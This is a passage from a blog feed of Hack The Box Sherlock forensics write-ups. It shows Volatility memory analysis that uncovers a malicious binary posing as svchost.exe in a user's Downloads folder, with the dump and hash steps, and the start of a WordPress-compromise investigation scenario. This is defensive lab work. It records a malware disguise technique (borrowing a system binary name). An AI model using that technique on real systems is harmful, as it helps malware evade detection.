</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b88bfb810	0x100	Desktop	0xf01ff	Default
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b88a4ad40	0x104	WindowStation	0xf037f	WinSta0
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808360	0x110	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d54a0c070	0x114	Key	0x20019	USER<span style="color:#f1fa8c">\S</span>-1-5-21-3239415629-1862073780-2394361899-1602_CLASSES<span style="color:#f1fa8c">\L</span>OCAL SETTINGS<span style="color:#f1fa8c">\S</span>OFTWARE<span style="color:#f1fa8c">\M</span>ICROSOFT
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d54a09920	0x118	Key	0x20019	USER<span style="color:#f1fa8c">\S</span>-1-5-21-3239415629-1862073780-2394361899-1602_CLASSES<span style="color:#f1fa8c">\L</span>OCAL SETTINGS
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809160	0x11c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563f70	0x120	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565470	0x124	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565550	0x128	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808a60	0x12c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808260	0x130	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808ae0	0x134	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808660	0x138	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808760	0x13c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808ee0	0x140	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565c50	0x144	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965666d0	0x148	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566970	0x14c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965650f0	0x150	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566430	0x154	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965659b0	0x158	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965657f0	0x15c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965651d0	0x160	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965658d0	0x164	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566350	0x168	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808460	0x16c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b82b080	0x170	Thread	0x1003	Tid <span style="color:#bd93f9">2032</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b6746f0	0x174	Mutant	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b674790	0x178	Mutant	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4dc1e9b0	0x17c	Token	0xf01ff	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b6748d0	0x180	Mutant	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b960de860	0x184	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8c7032f0	0x188	Mutant	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b6754b0	0x18c	Mutant	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565630	0x190	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0ae960	0x194	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965667b0	0x198	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566890	0x19c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566510	0x1a0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8083e0	0x1a4	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808f60	0x1a8	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8086e0	0x1ac	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565a90	0x1b4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564e50	0x1b8	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565390	0x1bc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b954232e0	0x1c0	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b95423b60	0x1c4	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b954234e0	0x1c8	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965652b0	0x1cc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564f30	0x1d0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565710	0x1d4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90127d90	0x1d8	TpWorkerFactory	0xf00ff	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567cc0	0x1dc	IoCompletion	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b6dd070	0x1e0	ALPC Port	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965665f0	0x1e4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565d30	0x1e8	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d54a0b4c0	0x1ec	Key	0x20019	USER
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565b70	0x1f0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b913841e0	0x1f4	File	0x100001	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\K</span>secDD
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b913857c0	0x1f8	File	0x100001	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\C</span>NG
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0a7fe0	0x208	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4dc1e9b0	0x20c	Token	0x8	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90910c44	0x210	VRegConfigurationContext	0x120189	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8af76e80	0x214	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0a7ee0	0x218	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0af3e0	0x21c	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565e10	0x220	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96565ef0	0x224	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965660b0	0x228	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0af760	0x22c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566190	0x230	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566270	0x234	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566f90	0x238	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567850	0x23c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965682d0	0x240	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96568570	0x244	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566c10	0x248	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96568110	0x24c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4dc1e9b0	0x250	Token	0x8	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8aec3080	0x254	Thread	0x1fffff	Tid <span style="color:#bd93f9">9240</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b961a2de0	0x258	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8af76930	0x25c	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b961a2c40	0x260	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965673f0	0x264	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b960de1e0	0x268	Semaphore	0x100003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b3632c0	0x26c	Thread	0x1fffff	Tid <span style="color:#bd93f9">7980</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965674d0	0x278	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567150	0x27c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567af0	0x280	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567070	0x284	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567f50	0x288	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566b30	0x28c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809360	0x290	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b960d8c60	0x294	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90910790	0x298	File	0x100080	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\N</span>si
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566a50	0x29c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567690	0x2ac	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96567230	0x2b4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96566eb0	0x2b8	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965683b0	0x2bc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965681f0	0x2c0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808c60	0x2c4	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b0e2070	0x2d0	ALPC Port	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b960cff60	0x2d4	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809ce0	0x2d8	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b909042b0	0x2dc	File	0x120089	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\N</span>amedPipe<span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>6812	svchost.exe	0x9e8b8aec3080	0x2e4	Thread	0x1fffff	Tid <span style="color:#bd93f9">9240</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b9090dbd4	0x2e8	TmEn	0x120196	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4a93e9b0	0x2ec	Token	0xf01ff	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90118080	0x2f0	Thread	0x1fffff	Tid <span style="color:#bd93f9">6328</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809960	0x2f4	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809de0	0x2f8	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b6ef080	0x2fc	Process	0x1fffff	cmd.exe Pid <span style="color:#bd93f9">4364</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8cd46270	0x308	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d52d94180	0x30c	Key	0x8	USER<span style="color:#f1fa8c">\S</span>-1-5-21-3239415629-1862073780-2394361899-1602<span style="color:#f1fa8c">\S</span>OFTWARE<span style="color:#f1fa8c">\M</span>ICROSOFT<span style="color:#f1fa8c">\W</span>INDOWS NT<span style="color:#f1fa8c">\C</span>URRENTVERSION
</span></span></code></pre></div><p>Interesting location</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>6812	svchost.exe	0xb58d4a3b02a0	0x44	Directory	0x3	KnownDlls
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90911280	0x48	File	0x100020	\Device\HarddiskVolume3\Users\simon.stark\Downloads
</span></span></code></pre></div><ul>
<li><em>Step 2: Search for the file in the <code>\Device\HarddiskVolume3\Users\simon.stark\Downloads</code>.</em></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.filescan | grep <span style="color:#f1fa8c">&#34;Users&#34;</span> | grep <span style="color:#f1fa8c">&#34;simon.stark&#34;</span> | grep <span style="color:#f1fa8c">&#34;Downloads&#34;</span>
</span></span><span style="display:flex;"><span>0x9e8b8ae28ca0.0<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b8ae29dd0	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b909045d0	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\s</span>vchost.exe	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b90911280	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b909142f0	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b91946a20	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads	<span style="color:#bd93f9">216</span>
</span></span><span style="display:flex;"><span>0x9e8b91ec0140	<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\s</span>vchost.exe	<span style="color:#bd93f9">216</span>
</span></span></code></pre></div><p>Dump Malicious File</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.dumpfiles --virtaddr 0x9e8b909045d0              
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                        
</span></span><span style="display:flex;"><span>Cache	FileObject	FileName	Result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DataSectionObject	0x9e8b909045d0	svchost.exe	Error dumping file
</span></span><span style="display:flex;"><span>ImageSectionObject	0x9e8b909045d0	svchost.exe	file.0x9e8b909045d0.0x9e8b957f24c0.ImageSectionObject.svchost.exe.img
</span></span></code></pre></div><p>Don&rsquo;t need the DataSectionObject to analyze the Binary. We are after the ImageSectionObject.</p>
<p>Check the Malware&rsquo;s md5sum and send it to the reverse engineering team.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ md5sum file.0x9e8b909045d0.0x9e8b957f24c0.ImageSectionObject.svchost.exe.img 
</span></span><span style="display:flex;"><span>5bd547c6f5bfc4858fe62c8867acfbb5  file.0x9e8b909045d0.0x9e8b957f24c0.ImageSectionObject.svchost.exe.img
</span></span></code></pre></div><p><strong>VirusTotal</strong></p>
<p>VirusTotal Detection Ratio:
<img src="images/20240611200132.png" alt="alt text"></p>
<h3 id="summary">Summary</h3>
<p>The TA used a legit Windows binary file name to blend into the processes. But in the we successfully discovered their C2 server and IoCs using memory forensics and from <a href="https://www.virustotal.com/gui/file/eaf09578d6eca82501aa2b3fcef473c3795ea365a9b33a252e5dc712c62981ea">VirusTotal</a> platform.</p>
]]></description></item><item><title>HTB Sherlock Ultimatum</title><link>https://hshakilst.github.io/posts/htb-sherlocks/ultimatum/</link><pubDate>Mon, 27 May 2024 13:25:02 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/ultimatum/</guid><description><![CDATA[<h1 id="ultimatum-dfirhttpsapphacktheboxcomsherlocksultimatum"><a href="https://app.hackthebox.com/sherlocks/Ultimatum">Ultimatum (DFIR)</a></h1>
<h2 id="scenario">Scenario</h2>
<p>One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believes this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.</p>
<h2 id="forensics">Forensics</h2>
<h3 id="artifacts">Artifacts</h3>
<p>We are given an archive <code>ultimatum.zip</code> with a <code>sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66</code>.</p>
<p>Upon extracting the archive use <a href="https://github.com/WithSecureLabs/LinuxCatScale/blob/master/Extract-Cat-Scale.sh">Extract-Cat-Scale.sh</a> we get the following artifacts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>console<span style="color:#ff79c6">-</span>error<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Docker:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Logs:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">488</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">451801</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>btmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">606</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmpdump<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>wtmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2397</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lastlog<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">396</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>passwd<span style="color:#ff79c6">-</span>check<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">12</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">115</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">.</span>tar<span style="color:#ff79c6">.</span>gz
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2975</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">291</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>who<span style="color:#ff79c6">.</span>txt
